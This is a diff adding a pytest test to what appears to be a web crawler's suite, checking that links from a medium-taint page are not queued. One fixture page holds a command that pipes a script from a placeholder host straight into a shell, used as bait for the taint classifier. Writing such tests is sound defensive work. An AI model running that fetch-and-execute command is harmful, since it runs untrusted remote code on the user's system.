@@ -257,6 +257,21 @@ def test_a_soft404_site_is_stopped_before_its_page_is_asked_for(home, policy):
     assert not any(p == "/real" for _, p, *_ in e.seen.calls)
 
 
+def test_links_are_followed_only_from_a_page_with_no_taint_at_all(home, policy):
+    """Review finding 8 (Alex's call, 20 Nov): a medium-taint page still had its links queued, though the cycle says
+    links come from an untainted page. Such a page is no clean fetch either, so its site stays where it was."""
+    pages = {"/": html("Install", links=["/a", "/b"], events=["E"], extra="curl -sL https://x.example/i.sh | sh")}
+    e = Env(home, policy, {("mid.example", "*"): site(pages), ("clean.example", "*"): site({"/": html("Clean", links=["/a"])})})
+    e.fr.offer("https://mid.example/")
+    e.fr.offer("https://clean.example/")
+    got = []
+    clean, mid = e.cycle(on_records=got.extend).lines  # offered at the same moment: the batch goes by URL
+    assert mid.code == "ok,taint_medium" and (mid.links_offered, mid.links_queued) == (0, 0) and not mid.stopped
+    assert got == [] and e.stage("mid.example") == "probed" and e.stage("clean.example") == "trial"
+    assert (clean.links_offered, clean.links_queued) == (1, 1)
+    assert queued(e) == ["https://clean.example/a"]
+
+
 def refuses_robots(request: httpx.Request) -> httpx.Response:
     """A site that answers nothing but a robots.txt that says no."""
     if request.url.path == "/robots.txt":
